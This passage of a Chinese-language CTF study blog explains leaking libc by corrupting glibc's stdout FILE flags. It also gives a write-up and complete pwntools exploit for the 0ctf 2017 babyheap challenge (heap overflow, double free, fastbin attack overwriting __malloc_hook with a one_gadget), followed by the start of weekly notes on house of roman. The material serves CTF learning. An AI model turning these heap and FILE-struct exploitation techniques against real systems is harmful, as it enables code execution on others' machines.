class="line">_IO_new_file_overflow (_IO_FILE *f, int ch)</span><br><span class="line">&#123;</span><br><span class="line">  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  /* If currently reading or no buffer allocated. */</span><br><span class="line">  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Allocate a buffer if needed. */</span><br><span class="line">      if (f-&gt;_IO_write_base == NULL)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      /* Otherwise must be currently reading.</span><br><span class="line">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span><br><span class="line">	 logically slide the buffer forwards one block (by setting the</span><br><span class="line">	 read pointers to all point at the beginning of the block).  This</span><br><span class="line">	 makes room for subsequent output.</span><br><span class="line">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span><br><span class="line">	 alone, so it can continue to correspond to the external position). */</span><br><span class="line">      if (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  if (ch == EOF)</span><br></pre></td></tr></table></figure>
+
+<p>上面即是_IO_new_file_overflow`函数的部分代码，我们想要利用的就是最后的_IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base)，IO_do_write就是我们需要执行的目标函数，这个函数执行后会调用系统调用write输出输出缓冲区，传入_IO_do_write函数的参数为：stdout结构体、_IO_write_base（输出缓冲区起始地址）和size（_IO_write_end - _IO_write_base计算得来）</p>
+<p>如果我们事先在stdout的_IO_write_base的位置部署要输出的起始地址，那么在去利用_IO_do_write函数，即可打印部分内存地址，打印出来的内容就包含我们所需要泄露的libc</p>
+<p>如果我们想要利用_IO_do_write函数的话是需要绕过_IO_new_file_overflow函数的检查的，就是上图中蓝色框中的判断条件，我们一步一步的分解_IO_new_file_overflow函数的这两个判断条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, int ch)</span><br><span class="line">&#123;</span><br><span class="line">  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先我们来看第一个判断条件，这里判断_flags的标志位是否包含<code>_IO_NO_WRITES</code>，将_flags和_IO_NO_WRITES进行一个按位与的操作，我们可以向前翻一下flag规则的章节，_flag与_IO_NO_WRITES各自定义的常量为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* 魔数 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* 不可写 */</span></span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到_flag魔数的常量为0xfbad0000，_IO_NO_WRITES不可写标志位的常量为8，我们返回上图的程序中，如果进行按位与操作之后的结果为真，则返回为错误。一旦返回的是错误，那么后续我们想要利用的_IO_do_write函数就不会再被执行了，所以我们要将此处的与运算为假：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line">_flags &amp; _IO_NO_WRITES = <span class="number">0</span> </span><br><span class="line">_flags = <span class="number">0xfbad0000</span></span><br></pre></td></tr></table></figure>
+
+<p>这样一来判断条件中与运算就会为假，就不会执行判断中的语句了。接下来我们看一下第二个判断条件：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210219111014894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70"></p>
+<p>第二个判断是为了检查输出缓冲区是否为空，如果为空则进行分配空间，并且会初始化指针。一旦进行初始化操作，那么就会覆盖掉我们事先在stdout的_IO_write_base的数据，这样一来我们其实是无法完全掌控的。所以这个判断条件分支尽可能的也不进入，那么我们将if判断条件的值为假即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</span><br></pre></td></tr></table></figure>
+
+<p>我们拆开来看这个判断条件，由两部分组成，并用或连接。先看后半部分f-&gt;_IO_write_base == NULL，这里由于会在_IO_write_base中部署数据，所有后半部分的条件判断一定为假。那么这样一来我们将前半部分也为假，即f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = 1，则整个判断就为假：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line">f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad0800</span></span><br></pre></td></tr></table></figure>
+
+<p>_IO_new_do_write –&gt; new_do_write</p>
+<p>经过前面的_flags的处理，即可顺利执行到_IO_do_write函数，跟进_IO_do_write函数后将会进入_IO_new_do_write函数，我们来看一下这个函数的源码，位置在glibc/libio/fileops.c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  return (to_do == 0</span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到_IO_new_do_write并没有做太多的操作，就调用了new_do_write函数，new_do_write函数的参数其实是和传入的参数是一样的，一参stdout结构体，二参输出缓冲区起始地址，三参输出长度<br>new_do_write –&gt; _IO_SYSWRITE</p>
+<p>我们一起来看一下new_do_write函数中的源码，位置在glibc/libio/fileops.c<br><img src="https://img-blog.csdnimg.cn/20210219151953422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70"></p>
+<p>可以看到上图即是new_do_write函数中的源码了，红色框中的_IO_SYSWRITE函数即是IO_FILE的最终目标，执行系统调用write。但是同时我们还能看到前面又经过了两次判断，其中第一次if判断与_flags相关，else if中的内容同样需要仔细斟酌一下。由于if和else if是幸福二选一，如果两个判断条件都不满足的话，是不会继续执行到518行的系统调用的</p>
+<p>我们先看这个比较复杂的else if判断：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">   &#123;</span><br><span class="line">     _IO_off64_t new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);</span><br><span class="line">     if (new_pos == _IO_pos_BAD)</span><br><span class="line">return 0;</span><br><span class="line">     fp-&gt;_offset = new_pos;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这条分支我们尽可能的不碰，原因有两点：</p>
+<pre><code>第一，其实只要满足判断中的条件fp-&gt;_IO_read_end = fp-&gt;_IO_write_base即可绕过这里的判断，使之相等的操作并不是没有可能，但是在实际操作中实现的几率比较小。一般在做这种题的时候都会伴随着随机化保护的开启，进行攻击的时候，我们一般采用的都是覆盖末位字节的方式造成偏移，因为即使随机化偏移也会存在0x1000对齐。但是这时候就会遇到一个很尴尬的情况，_IO_read_end和_IO_write_base存放的地址是由末位字节和其他高字节共同组成的，其他高字节由于随机化的缘故无法确定，所以何谈使两个成员变量中的地址相等呢
+第二，可以看到else if这条分支中调用了_IO_SYSSEEK系统调用，即lssek函数，如果我们将_IO_read_end的值设置为0，那么_IO_SYSSEEK的二参fp-&gt;_IO_write_base - fp-&gt;_IO_read_end得出的数值就有可能非常大，这就会导致sleek函数执行不成功导致退出，这是因为载入内存的数据范围可能并不大，但是经过sleek函数修改过大的偏移之后超过了数据范围的边界。一旦Sleek函数执行不成功导致退出，那么就不会到达我们想要的_IO_SYSWRITE系统调用了
+</code></pre>
+<p>所以综上所述，我们无法完全掌控_IO_read_end和_IO_write_base中的数值，导致进入else if的分支后程序执行流程不可控</p>
+<p>接下来我们看一下if分支：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">   /* On a system without a proper O_APPEND implementation,</span><br><span class="line">      you would need to sys_seek(0, SEEK_END) here, but is</span><br><span class="line">      not needed nor desirable for Unix- or Posix-like systems.</span><br><span class="line">      Instead, just indicate that offset (before and after) is</span><br><span class="line">      unpredictable. */</span><br><span class="line">   fp-&gt;_offset = _IO_pos_BAD;</span><br></pre></td></tr></table></figure>
+
+<p>if分支相对来说造成的影响就比较小了，内部仅仅将偏移设置为标准值，不会影响后续的输出流程。并且if判断的条件也很容易满足，我们只需要将<code>fp-&gt;_flags &amp; _IO_IS_APPENDING = 1</code>即可，只对_flag修改不会影响其他部分：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line">fp-&gt;_flags &amp; _IO_IS_APPENDING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad1000</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就可以到达_IO_SYSWRITE系统调用了！</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以通过上述的讲解，我们只需要满足如下几条对_flags的设定，即可利用_IO_2_1_stdout泄露libc</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br></pre></td></tr></table></figure>
+
+<p>1、设置<code>_flags &amp; _IO_NO_WRITES = 0</code><br> 2、设置<code>_flags &amp; _IO_CURRENTLY_PUTTING = 1</code><br> 3、设置<code>_flags &amp; _IO_IS_APPENDING = 1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_flags = 0xFBAD1800</span><br></pre></td></tr></table></figure>
+
+<p>4、设置_IO_write_base指向想要泄露的位置，_IO_write_ptr指向泄露结束的地址(不需要一定设置指向结尾，程序中自带地址足够泄露libc)</p>
+<p>hollk师傅的：好好说话之IO_FILE利用（1）</p>
+<p>学习笔记</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/08/04/0ctf-2017-babyheap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/04/0ctf-2017-babyheap/" class="post-title-link" itemprop="url">0ctf_2017_babyheap</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-08-04 02:15:45 / Modified: 19:06:33" itemprop="dateCreated datePublished" datetime="2022-08-04T02:15:45+08:00">2022-08-04</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>一道比较简单的堆题，但是因为一些比较nt的原因，导致做了很久才出shell</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先编辑堆块的地方有一个很明显的堆溢出（输入字符串任意大小）</p>
+<p><img src="https://s2.loli.net/2022/08/04/m9bdQfiTtKRPXnA.png" alt="图片.png"></p>
+<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>1.通过堆溢出，来构成一个double free</p>
+<p>2.通过double free来泄露unsorted bin指向的main_arena</p>
+<p>3.利用fast bin attack来修改malloc_hook为one_gadget(寻找‘\x7f’作为fake_chunk的size位)</p>
+<h2 id="利用堆溢出，构造double-free"><a href="#利用堆溢出，构造double-free" class="headerlink" title="利用堆溢出，构造double free"></a>利用堆溢出，构造double free</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add(0x10)#0</span><br><span class="line">add(0x10)#1</span><br><span class="line">add(0x10)#2</span><br><span class="line">add(0x10)#3</span><br><span class="line">add(0x80)#4</span><br><span class="line">add(0x10)#5防止unsorted bin和topchunk合并</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+b&#x27;\x80&#x27;#修改fd指针指向chunk4</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line">payload1=p64(0)*3+b&#x27;\x21&#x27;</span><br><span class="line">fill(3,len(payload1),payload1)</span><br><span class="line">add(0x10)#1</span><br><span class="line">add(0x10)#2and4同时指向chunk4</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用double-free泄露main-arena"><a href="#利用double-free泄露main-arena" class="headerlink" title="利用double free泄露main_arena"></a>利用double free泄露main_arena</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload2=p64(0)*3+b&#x27;\x91&#x27;</span><br><span class="line">fill(3,len(payload2),payload2)#将chunk4的size修改回来</span><br><span class="line">delete(4)</span><br><span class="line">show(2)</span><br><span class="line">malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))-88-0x10</span><br><span class="line">print(&quot;malloc_hook:&quot;+hex(malloc_hook))</span><br><span class="line">base=malloc_hook-libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">onegadget=base+0x4526a</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用fast-bin-attack修改malloc-hook"><a href="#利用fast-bin-attack修改malloc-hook" class="headerlink" title="利用fast bin attack修改malloc_hook"></a>利用fast bin attack修改malloc_hook</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(0x60)#4切割unsorted bin</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">payload3=p64(malloc_hook-0x8-0x2-0x8-1-0x10)#在malloc_hook的低地址处寻找‘/x7f’</span><br><span class="line">fill(2,len(payload3),payload3)#利用double free的指针2修改fast bin的fd指针指向malloc_hook附近构造fake chunk</span><br><span class="line">add(0x60)#4</span><br><span class="line">add(0x60)#6</span><br><span class="line">payload4=b&#x27;A&#x27;*(0x8+0x2+0x8+1)+p64(onegadget)</span><br><span class="line">fill(6,len(payload4),payload4)</span><br><span class="line">add(0x10)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&quot;./0ctf_2017_babyheap&quot;)</span><br><span class="line">#io=remote(&quot;node4.buuoj.cn&quot;,28039)</span><br><span class="line">elf=ELF(&quot;./0ctf_2017_babyheap&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span><br><span class="line">#libc=ELF(&quot;./libc-2.23_64.so&quot;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    io.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    io.sendline(b&#x27;1&#x27;)</span><br><span class="line">    io.recvuntil(&quot;Size: &quot;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def fill(index,size,content):</span><br><span class="line">    io.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    io.sendline(b&#x27;2&#x27;)</span><br><span class="line">    io.recvuntil(&quot;Index: &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.recvuntil(&quot;Size: &quot;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(&quot;Content: &quot;)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    io.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    io.sendline(b&#x27;3&#x27;)</span><br><span class="line">    io.recvuntil(&quot;Index: &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    io.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    io.sendline(b&#x27;4&#x27;)</span><br><span class="line">    io.recvuntil(&quot;Index: &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x10)#0</span><br><span class="line">add(0x10)#1</span><br><span class="line">add(0x10)#2</span><br><span class="line">add(0x10)#3</span><br><span class="line">add(0x80)#4</span><br><span class="line">add(0x10)#5</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+b&#x27;\x80&#x27;</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line">payload1=p64(0)*3+b&#x27;\x21&#x27;</span><br><span class="line">fill(3,len(payload1),payload1)</span><br><span class="line">add(0x10)#1</span><br><span class="line">add(0x10)#2and4</span><br><span class="line">payload2=p64(0)*3+b&#x27;\x91&#x27;</span><br><span class="line">fill(3,len(payload2),payload2)</span><br><span class="line">delete(4)</span><br><span class="line">show(2)</span><br><span class="line">malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))-88-0x10</span><br><span class="line">print(&quot;malloc_hook:&quot;+hex(malloc_hook))</span><br><span class="line">base=malloc_hook-libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">onegadget=base+0x4526a</span><br><span class="line">add(0x60)#4</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">payload3=p64(malloc_hook-0x8-0x2-0x8-1-0x10)</span><br><span class="line">fill(2,len(payload3),payload3)</span><br><span class="line">add(0x60)#4</span><br><span class="line">add(0x60)#6</span><br><span class="line">payload4=b&#x27;A&#x27;*(0x8+0x2+0x8+1)+p64(onegadget)</span><br><span class="line">fill(6,len(payload4),payload4)</span><br><span class="line">add(0x10)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/08/01/io-file/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/01/io-file/" class="post-title-link" itemprop="url">io_file</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-08-01 16:27:46 / Modified: 16:28:38" itemprop="dateCreated datePublished" datetime="2022-08-01T16:27:46+08:00">2022-08-01</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="完成事项"><a href="#完成事项" class="headerlink" title="完成事项"></a>完成事项</h1><p>house of roman,io_file结构体大概看了下，刷题（少）</p>
+<h1 id="未完成事项"><a href="#未完成事项" class="headerlink" title="未完成事项"></a>未完成事项</h1><p>house of pig(等多了解点io再回来看）</p>
+<h1 id="下周待做事项"><a href="#下周待做事项" class="headerlink" title="下周待做事项"></a>下周待做事项</h1><p>把hexo博客重新搭起来开始写点笔记，io多了解一点，刷题刷题</p>
+<h1 id="本周知识分享"><a href="#本周知识分享" class="headerlink" title="本周知识分享"></a>本周知识分享</h1><p>先大概总结下house of roman，首先需要uaf漏洞并且可以创建任意大小的chunk，和其他手法不同的是他的作用在于可以不需要一个泄露libc的过程，即不需要泄露函数，可以直接修改malloc_hook的低地址为one_gadget来获取shell</p>
+<h2 id="FILE结构（wiki）"><a href="#FILE结构（wiki）" class="headerlink" title="FILE结构（wiki）"></a>FILE结构（wiki）</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。</p>
+<p>FILE 结构定义在 libio.h 中，如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 